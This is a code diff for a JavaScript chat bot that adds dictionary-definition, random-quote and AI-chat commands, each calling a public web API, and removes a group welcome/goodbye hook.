+        case 'meaning': {
+            if (!text) return reply(`Usage: ${prefix}define <word>`);
+            try {
+                const res = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(text)}`, { timeout: 15000 });
+                const entry = res.data[0];
+                const phonetic = entry.phonetic || entry.phonetics?.find(p => p.text)?.text || '';
+                let out = `📖 *${entry.word}* ${phonetic}\n`;
+                entry.meanings.slice(0, 3).forEach(meaning => {
+                    out += `\n*${meaning.partOfSpeech}*\n`;
+                    meaning.definitions.slice(0, 2).forEach((d, i) => {
+                        out += `${i + 1}. ${d.definition}\n`;
+                        if (d.example) out += `   _"${d.example}"_\n`;
+                    });
+                });
+                reply(out);
+            } catch (err) {
+                reply(`❌ No definition found for *${text}*.`);
+            }
+            break;
+        }
+
+        // ═══════════════════════════════════════════════════
+        // QUOTE (zenquotes.io — free, no API key)
+        // ═══════════════════════════════════════════════════
+        case 'quote':
+        case 'quotes': {
+            try {
+                const res = await axios.get('https://zenquotes.io/api/random', { timeout: 15000 });
+                const q0 = res.data?.[0];
+                if (!q0) return reply('❌ Could not fetch a quote right now.');
+                reply(`💬 _"${q0.q}"_\n\n— *${q0.a}*`);
+            } catch (err) {
+                reply(`❌ *Quote lookup failed:* ${err.message || 'Unknown error'}`);
+            }
+            break;
+        }
+
+        // ═══════════════════════════════════════════════════
+        // AI CHAT (OmegaTech API — Kimi model)
+        // ═══════════════════════════════════════════════════
+        case 'ai':
+        case 'chat':
+        case 'gpt': {
+            if (!text) return reply(`Usage: ${prefix}ai <your question>`);
+            try {
+                const res = await axios.get('https://omegatech-api.dixonomega.tech/api/ai/kimi', {
+                    params: { q: text },
+                    timeout: 30000
+                });
+                const answer = res.data?.result || res.data?.answer || res.data?.message;
+                if (!answer) return reply('❌ No response from AI right now.');
+                reply(`🤖 *AI:*\n\n${answer}`);
+            } catch (err) {
+                reply(`❌ *AI request failed:* ${err.message || 'Unknown error'}`);
+            }
+            break;
+        }
+
         default:
             break;
         }
@@ -2994,21 +4266,6 @@ ${adminList}`,
 
 // ========== ANTI-CALL EXPORT ==========
 module.exports.handleAntiCall = handleAntiCall;
-
-// ========== GROUP PARTICIPANTS UPDATE (welcome/goodbye) ==========
-const originalGroupParticipantsUpdate = empire.groupParticipantsUpdate;
-empire.groupParticipantsUpdate = async function (update) {
-    try {
-        const result = await originalGroupParticipantsUpdate?.apply(this, arguments);
-        if (update?.id && update?.participants) {
-            const gm = await this.groupMetadata(update.id).catch(() => null);
-            if (gm) {
-                await handleGroupParticipantsUpdate(this, update, gm, this.user.id);
-            }
-        }
-        return result;
-    } catch (e) { console.error('Group update error:', e); }
-};
 
 // ========== HOT RELOAD ==========
 let file = require.resolve(__filename);
